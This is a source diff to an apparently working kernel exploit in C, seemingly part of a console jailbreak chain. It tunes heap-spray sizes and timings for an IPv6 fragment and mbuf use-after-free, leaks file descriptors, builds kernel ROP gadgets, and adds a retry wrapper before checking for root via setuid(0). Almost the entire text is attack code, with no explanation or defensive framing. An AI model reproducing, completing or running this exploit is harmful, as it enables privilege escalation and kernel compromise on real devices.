@@ -9,6 +9,7 @@
 #include <sys/vmmeter.h>
 #include <sys/filio.h>
 #include <sys/ioctl.h>
+#include <sys/poll.h>
 #include <netinet/in.h>
 #include <string.h>
 #include <unistd.h>
@@ -98,8 +99,9 @@ void send_shifted_fragment(int fd, char* src, size_t off, size_t sz, int is_fina
 #define RTHDR_1_SZ 0x50
 #define RTHDR_2_SZ 32 // >8 to prevent double-free on second mbuf
 #define FIRST_FRAGMENT_SZ 0x38
-#define SPRAY_SIZE 256
+#define SPRAY_SIZE 384
 #define NUM_UNIX 256
+#define NUM_PACKETS 256
 #define MAX_FDS 128
 #define FD_LEAK_SIZE 80
 
@@ -313,20 +315,16 @@ int leak_fds(int* fd_to_leak, uintptr_t* out, int nfds, int bads[3])
         buf_unix[i] = 0;
     build_rthdr(buf, RTHDR_1_SZ);
     build_rthdr(buf + RTHDR_1_SZ, RTHDR_2_SZ);
-    //nanosleep((void*)"\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 0);
     nanosleep((void*)"\0\0\0\0\0\0\0\0\x00\xe1\xf5\x05\0\0\0\0", 0);
     send_fragment(sock, buf, 0, FIRST_FRAGMENT_SZ, 0, 0xdead0002, 43);
     send_fragment(sock, buf, FIRST_FRAGMENT_SZ, sizeof(buf) - FIRST_FRAGMENT_SZ, 1, 0xdead0002, 43);
-    //nanosleep((void*)"\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 0);
-    nanosleep((void*)"\0\0\0\0\0\0\0\0\x00\xe1\xf5\x05\0\0\0\0", 0);
+    nanosleep((void*)"\0\0\0\0\0\0\0\0\x00\xa3\xe1\x11\0\0\0\0", 0);
     for(int i = 0; i < SPRAY_SIZE; i++)
     {
         push_cluster(socks, i);
-        nanosleep((void*)"\0\0\0\0\0\0\0\0\x40\x42\x0f\0\0\0\0\0", 0);
-        //nanosleep((void*)"\0\0\0\0\0\0\0\0\x80\x96\x98\0\0\0\0\0", 0);
+        nanosleep((void*)"\0\0\0\0\0\0\0\0\xc0\xc6\x2d\0\0\0\0\0", 0);
     }
-    //nanosleep((void*)"\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 0);
-    nanosleep((void*)"\0\0\0\0\0\0\0\0\x00\xe1\xf5\x05\0\0\0\0", 0);
+    nanosleep((void*)"\0\0\0\0\0\0\0\0\x00\xa3\xe1\x11\0\0\0\0", 0);
     int bad1 = -1, bad2 = -1;
     for(int i = 0; i < SPRAY_SIZE; i++)
     {
@@ -385,7 +383,7 @@ int leak_fds(int* fd_to_leak, uintptr_t* out, int nfds, int bads[3])
     return 0;
 }
 
-int trigger(int trg_fd, uintptr_t trg_addr, int bad_fds[2], int* sel_cur)
+int trigger(int trg_fd, uintptr_t trg_addr, int bad_fds[3], int* sel_cur)
 {
     printf("starting kex...\n");
     cpuset_t xxx;
@@ -397,6 +395,7 @@ int trigger(int trg_fd, uintptr_t trg_addr, int bad_fds[2], int* sel_cur)
     for(int i = 0; i < SPRAY_SIZE; i++)
         socks[i] = create_loopback();
     int un[2*NUM_UNIX];
+    int sp_or = 0;
     for(int i = 0; i < NUM_UNIX; i++)
         socketpair(AF_UNIX, SOCK_STREAM, 0, un+2*i);
     char buf[RTHDR_1_SZ + RTHDR_2_SZ];
@@ -408,20 +407,16 @@ int trigger(int trg_fd, uintptr_t trg_addr, int bad_fds[2], int* sel_cur)
         buf_unix[i] = 0;
     build_rthdr(buf, RTHDR_1_SZ);
     build_rthdr(buf + RTHDR_1_SZ, RTHDR_2_SZ);
-    //nanosleep((void*)"\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 0);
     nanosleep((void*)"\0\0\0\0\0\0\0\0\x00\xe1\xf5\x05\0\0\0\0", 0);
     send_fragment(sock, buf, 0, FIRST_FRAGMENT_SZ, 0, 0xdead0002, 43);
     send_fragment(sock, buf, FIRST_FRAGMENT_SZ, sizeof(buf) - FIRST_FRAGMENT_SZ, 1, 0xdead0002, 43);
-    //nanosleep((void*)"\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 0);
-    nanosleep((void*)"\0\0\0\0\0\0\0\0\x00\xe1\xf5\x05\0\0\0\0", 0);
+    nanosleep((void*)"\0\0\0\0\0\0\0\0\x00\xa3\xe1\x11\0\0\0\0", 0);
     for(int i = 0; i < SPRAY_SIZE; i++)
     {
         push_cluster(socks, i);
-        nanosleep((void*)"\0\0\0\0\0\0\0\0\x40\x42\x0f\0\0\0\0\0", 0);
-        //nanosleep((void*)"\0\0\0\0\0\0\0\0\x80\x96\x98\0\0\0\0\0", 0);
+        nanosleep((void*)"\0\0\0\0\0\0\0\0\xc0\xc6\x2d\0\0\0\0\0", 0);
     }
-    //nanosleep((void*)"\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 0);
-    nanosleep((void*)"\0\0\0\0\0\0\0\0\x00\xe1\xf5\x05\0\0\0\0", 0);
+    nanosleep((void*)"\0\0\0\0\0\0\0\0\x00\xa3\xe1\x11\0\0\0\0", 0);
     int bad1 = -1, bad2 = -1;
     for(int i = 0; i < SPRAY_SIZE; i++)
     {
@@ -434,6 +429,18 @@ int trigger(int trg_fd, uintptr_t trg_addr, int bad_fds[2], int* sel_cur)
         printf("trigger: no collision\n");
         return 1;
     }
+    else if(bad1 == 48)
+    {
+        printf("bogus48, restarting...\n");
+        bad_fds[-1] = socks[bad1];
+        close(sock);
+        for(int i = 0; i < SPRAY_SIZE; i++)
+            if(i != bad1)
+                close(socks[i]);
+        for(int i = 0; i < 2*NUM_UNIX; i++)
+            close(un[i]);
+        return 48;
+    }
     //print_mbuf_addr(socks[bad1]);
     //print_mbuf_addr(socks[bad2]);
     pop_mbuf(socks, bad1);
@@ -443,7 +450,7 @@ int trigger(int trg_fd, uintptr_t trg_addr, int bad_fds[2], int* sel_cur)
     buf[2] = 1;
     buf[3] = 4;
     buf[4] = buf[5] = buf[6] = buf[7] = 0x41;
-    for(int i = 0; i < NUM_UNIX; i++)
+    for(int i = 0; i < NUM_PACKETS; i++)
         send_shifted_fragment(sock, buf, 0, FIRST_FRAGMENT_SZ, 0, 0xfee10000+i, 60);
     //nanosleep((void*)"\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 0);
     nanosleep((void*)"\0\0\0\0\0\0\0\0\x00\xe1\xf5\x05\0\0\0\0", 0);
@@ -464,7 +471,7 @@ int trigger(int trg_fd, uintptr_t trg_addr, int bad_fds[2], int* sel_cur)
     char x = 'X';
     for(int i = 0; i < NUM_UNIX; i++)
         write_fd(un[2*i], buf_unix, sizeof(buf_unix), fd_to_pass, 32);
-    for(int i = 0; i < NUM_UNIX; i++)
+    for(int i = 0; i < NUM_PACKETS; i++)
         if(i != uaf_idx)
             send_fragment(sock, buf_final, FIRST_FRAGMENT_SZ, 1, 1, 0xfee10000+i, 60);
     if(1)
@@ -479,9 +486,8 @@ int trigger(int trg_fd, uintptr_t trg_addr, int bad_fds[2], int* sel_cur)
         send_fragment(sock, buf_final - off, off, 3807, 1, 0xfee10000+i, 60);
     }
     nanosleep((void*)"\0\0\0\0\0\0\0\0\x00\xe1\xf5\x05\0\0\0\0", 0);
-    fd_set ss;
-    FD_ZERO(&ss);
-    struct timeval for_select = {0, 0};
+    int ss[32];
+    struct pollfd pfd = {.events = POLLIN, .revents = 0};
     bad_fds[0] = socks[bad1];
     bad_fds[1] = socks[bad2];
     int bad_un = -1;
@@ -495,13 +501,8 @@ int trigger(int trg_fd, uintptr_t trg_addr, int bad_fds[2], int* sel_cur)
         }
         for(int j = 0; j < 32; j++)
         {
-            *sel_cur = fd_to_pass[j];
-            if(fd_to_pass[j] < 2048) // wtf if not
-            {
-                FD_SET(fd_to_pass[j], &ss);
-                select(fd_to_pass[j]+1, &ss, 0, 0, &for_select); //kpayload
-                FD_CLR(fd_to_pass[j], &ss);
-            }
+            *sel_cur = pfd.fd = fd_to_pass[j];
+            poll(&pfd, 1, 0); //kpayload
             close(fd_to_pass[j]);
         }
     }
@@ -613,10 +614,36 @@ extern unsigned long long kp_kernel_base;
 extern unsigned long long kernel_fixup_ret;
 extern unsigned long long kp_decref_fp;
 
+void stack_sanity(void)
+{
+    char data[16384];
+    for(int i = 0; i < 16384; i++)
+        data[i] = 0xb3;
+}
+
+int wrap_trigger(int trg_fd, uintptr_t trg_addr, int bad_fds[2], int* sel_cur)
+{
+    stack_sanity();
+    int ans = trigger(trg_fd, trg_addr, bad_fds, sel_cur);
+    if(ans == 48)
+    {
+        stack_sanity();
+        ans = trigger(trg_fd, trg_addr, bad_fds, sel_cur);
+    }
+    if(ans == 48)
+    {
+        printf("bogus48 hit twice, exiting\n");
+        ans = 1;
+    }
+    return ans;
+}
+
+#if 1
 int main()
 {
     if(!setuid(0)) //already exploited
         return 179;
+    nanosleep("\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0");
     int kp_bad_fds[7];
     int fd[256];
     char path[] = "/0123456789/common/lib/libkernel.sprx";
@@ -635,7 +662,7 @@ int main()
         printf("leak_fds failed\n");
         return 1;
     }
-    for(int i = 0; i < 80; i++)
+    for(int i = 0; i < FD_LEAK_SIZE; i++)
         printf("%d %d %p\n", i, fd[i], (void*)leak[i]);
     int low = -1, high = -1;
     for(int i = 0; i < FD_LEAK_SIZE && low < 0; i++)
@@ -856,9 +883,11 @@ int main()
     dead[1] = rdi;
     dead[4] = __builtin_gadget_addr("$webkit_base + 0x1480be2"); //mov rdi, [rax + 8] ; mov rax, [rdi] ; jmp [rax + 0x68]
     /* end krop stuff */
-    if(trigger(fd[high], leak[low] + 0x1b, kp_bad_fds+3, kp_bad_fds+6))
+    kp_bad_fds[3] = kp_bad_fds[2];
+    if(wrap_trigger(fd[high], leak[low] + 0x1b, kp_bad_fds+4, kp_bad_fds+7))
     {
         printf("trigger failed\n");
+        printf("%d\n", setuid(0));
         return 1;
     }
     if(magic == 0xdeadbeef)
@@ -870,3 +899,13 @@ int main()
     printf("%d\n", setuid(0));
     return 0;
 }
+
+#else
+
+int main()
+{
+    int kp_bad_fds[7];
+    return wrap_trigger(123, 123, kp_bad_fds+4, kp_bad_fds+7);
+}
+
+#endif
